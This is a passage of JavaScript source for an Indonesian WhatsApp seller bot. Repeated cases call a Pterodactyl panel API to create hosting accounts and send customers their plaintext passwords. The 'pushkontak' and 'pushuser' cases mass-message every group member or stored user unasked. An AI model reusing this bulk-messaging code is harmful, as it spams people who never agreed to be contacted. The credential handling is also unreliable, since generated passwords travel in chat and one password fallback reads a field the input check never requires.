"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break
case "5gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5120"
let cpu = "130"
let disk = "5120"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break
case "6gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────`)

}

break

case "7gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7170"
let cpu = "175"
let disk = "7170"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────`)

}

break

case "8gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8190"
let cpu = "185"
let disk = "8190"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────`)

}

break

case "9gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "9220"
let cpu = "195"
let disk = "9220"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────`)

}

break


case "10gb": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Seller Dan Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "10240"
let cpu = "210"
let disk = "10240"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────`)

}

break


case "unli": {
if (!isCreator) return m.reply(`Fitur Ini Khusus Owner`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
akunlo = "https://static.vecteezy.com/system/resources/previews/006/732/119/original/account-icon-sign-symbol-logo-design-free-vector.jpg" 
if (!u) return
let d = (await yudamods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

┌⁠──────────⁠─────────
○
○ ID : ${user.id}
○ EMAIL : ${user.email}
○ USERNAME : ${user.username}
○ PASSWORD : ${password.toString()}
○ ️LOGIN : ${domain}
○ TOTURIAL : wa.me/6283842204546
○
└──────────⁠─────────

*NOTE :*
- MOHON DI SIMPAN ,KARENA BOT BIKIN AKUN PANEL HANYA 1× JADI JIKA HILANG JANGAN SALAHKAN BOT

- GARANSI 7 HARI DARI HARI PEMBELIAN PERTAMA

*JIKA DONE JANGAN LUPA SS DONE ATAU KETIK #DONE*
`
yudamods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: fkontak })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
┌⁠──────────⁠─────────
○ *SUCCESSFULLY ADD USER + SERVER*

○ TYPE: user

○ ID : ${user.id}
○ USERNAME : ${user.username}
○ EMAIL : ${user.email}
○ NAME : ${user.first_name} ${user.last_name}
○ MEMORY : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
○ DISK : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
○ CPU : ${server.limits.cpu}%
└──────────⁠─────────

`)

}

break



///BATAS CASE PANEL


//CASE PUSHKONTAK

     case "pushuser" : {
          if (!isCreator) return m.reply(mess.owner)
          if (!text) return m.reply(`Example ${prefix}${command} Hi Semuanya`)
          let signup = JSON.parse(fs.readFileSync('./database/user.json'))
            let count = signup.length;
            let sentCount = 0; 
            m.reply('*_Sedang Push User..._*');
            for (let i = 0; i < signup.length; i++) {
              setTimeout(function() {
                yudamods.sendMessage(signup[i], { text: text });
                count--;
                sentCount++;
                if (count === 0) {
                  m.reply(`*_Semua pesan telah dikirim!_*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
                }
              }, i * 5000); // delay setiap pengiriman selama 1 detik
            } 
          }
        break;
        
        case "pushkontakv2":
if (!isOwner) return khususOwner()
if (msg.isGroup) return reply(`Fitur Ini Hanya Bisa Digunakan Di Private Chat`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const hay = q.split("|")[1]
const groupMetadataa = !isGroup? await client.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
client.sendMessage(mem, { text: hay })
await sleep(5000)
}
break

        case "pushkontak" : {
          if (!text) return m.reply(`Example ${prefix}${command} Hi Semuanya`)
          if (!isCreator) return m.reply(mess.owner)
          if (!m.isGroup) return m.reply(mess.group)
          if (!isBotAdmins) return m.reply(mess.botAdmin)
          if (!isAdmins) throw m.reply(mess.admin)
          let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
          let count = get.length;
          let sentCount = 0;
          m.reply('*_Sedang Push Kontak..._*');
          for (let i = 0; i < get.length; i++) {
            setTimeout(function() {
              yudamods.sendMessage(get[i], { text: text });
              count--;
              sentCount++;
              if (count === 0) {
                m.reply(`*_Semua pesan telah dikirim!_*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
              }
            }, i * 5000); // delay setiap pengiriman selama 1 detik
          }
        }
        break;
        case 'getidgc' :
        if (!m.isGroup) return m.reply(mess.group)
        m.reply (`${m.chat}`)
        break;
        case 'owner': case 'creator': {
          yudamods.sendContact(m.chat, global.owner, m)
      }
      break;
      
      
      case "idgrup": case "listidgc": {
if (!isCreator) return khususOwner()
let getGroups = await yudamods.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP ANDA*\n\nTotal Group : ${anu.length} GROUP\n\n`
for (let x of anu) {
let metadata2 = await yudamods.groupMetadata(x)
teks += `❏  ${metadata2.subject}\n┠─ *ID :* ${metadata2.id}\n┠─ *STATUS :* GROUP\n╰────| ANGGOTA : ${metadata2.participants.length}\n\n`
}
m.reply(teks + `Untuk Penggunaan Silahkan Ketik\nCommand ${prefix}pushkontak id|teks\n\nPOWER BY *© ${namabotnya}*`)
}
break

//BATAS CASE PUSHKONTAK



///GRUP CASE MENU

case'welcome':{
			if ((global.welcome || isWelcome)){ }
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
